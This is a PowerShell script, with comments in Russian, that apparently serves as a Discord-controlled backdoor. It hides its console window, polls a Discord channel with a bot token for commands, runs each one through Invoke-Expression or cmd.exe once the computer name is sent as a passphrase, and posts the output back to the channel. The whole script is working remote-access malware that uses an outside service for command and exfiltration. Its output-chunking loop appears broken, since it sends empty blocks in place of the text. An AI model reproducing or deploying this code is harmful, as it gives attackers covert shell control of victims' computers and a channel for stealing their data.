$token = "$tk"
$chan  = "$ch"
$response = ""
$previouscmd = ""
$authenticated = 0

# --- Скрытие окна (корректно) ---
$hide = 'y'
if($hide -eq 'y'){
    $code = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    Add-Type -MemberDefinition $code -Name HideWindow -Namespace Utils -PassThru | Out-Null
    $hwnd = (Get-Process -Id $PID).MainWindowHandle
    if($hwnd -ne 0){ [Utils.HideWindow]::ShowWindowAsync($hwnd, 0) | Out-Null }
}

function PullMsg {
    try {
        $wc = [System.Net.WebClient]::new()
        $wc.Headers.Add('Authorization', "Bot $token")
        $json = $wc.DownloadString("https://discord.com/api/v9/channels/$chan/messages?limit=10")
        $msg = ($json | ConvertFrom-Json | Where-Object {!$_.author.bot} | Select-Object -First 1).content
        if($msg){ $script:response = $msg.Trim() }
    } catch {}
}

function sendMsg {
    param([string]$Message)
    if(!$Message) { return }
    $Message = $Message -replace '`', 'ˋ'         # discord-markdown escape
    $uri = "https://discord.com/api/v9/channels/$chan/messages"
    $boundary = [guid]::NewGuid().ToString()
    $LF = "`r`n"
    $payload = @{content=$Message}
    $body = "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"payload_json`"$LF$LF" +
        ($payload | ConvertTo-Json -Compress) + "$LF" +
        "--$boundary--"
    try {
        Invoke-RestMethod -Uri $uri -Method Post -Headers @{Authorization="Bot $token"} -ContentType "multipart/form-data; boundary=$boundary" -Body ([text.encoding]::UTF8.GetBytes($body)) -TimeoutSec 10 | Out-Null
    } catch {}
}

Function Authenticate{
    if ($response -like "$env:COMPUTERNAME"){
        $script:authenticated = 1
        $script:previouscmd = $response
        sendMsg ":white_check_mark: **$env:COMPUTERNAME** | ``Session Started!`` :white_check_mark:"
        sendMsg "``PS | $($PWD.Path)>``"
    }
}

# =============================================================== MAIN LOOP =========================================================================
PullMsg
$previouscmd = $response
sendMsg ":hourglass_flowing_sand: **$env:COMPUTERNAME** | ``Session Waiting..`` :hourglass_flowing_sand:"

while ($true) {
    PullMsg
    if ($response -and $response -ne $previouscmd) {
        $previouscmd = $response
        $dir = $PWD.Path

        if ($authenticated -eq 1) {
            if ($response -eq "close") {
                sendMsg ":octagonal_sign: Session Closed."
                break
            }
            if ($response -eq "Pause") {
                $authenticated = 0
                sendMsg ":pause_button: Session Paused."
                continue
            }

            # Исполнение команды
            $out = ""
            try {
                $out = Invoke-Expression $response 2>&1 | Out-String
            } catch {
                $out = "$_"
            }

            # Если вывод пустой — пробуем через cmd (например, для "ipconfig", "ping" и др.)
            if ([string]::IsNullOrWhiteSpace($out)) {
                try {
                    $out = cmd.exe /c $response 2>&1 | Out-String
                } catch {
                    $out = "$_"
                }
            }

            # Разбиваем на куски по 1900 символов
            $text = $out.Trim()
            if (!$text) {
                sendMsg ":white_check_mark: ``Command Sent`` :white_check_mark:"
            } else {
                $maxBatchSize = 1900
                while($text.Length -gt 0) {
                    $chunk = $text.Substring(0, [Math]::Min($maxBatchSize, $text.Length))
                    sendMsg "``````"
                    $text = $text.Substring([Math]::Min($maxBatchSize, $text.Length))
                    Start-Sleep -Milliseconds 300
                }
            }

            sendMsg "``PS | $dir>``"
        } else {
            Authenticate
        }
    }
    Start-Sleep -Seconds 5
}

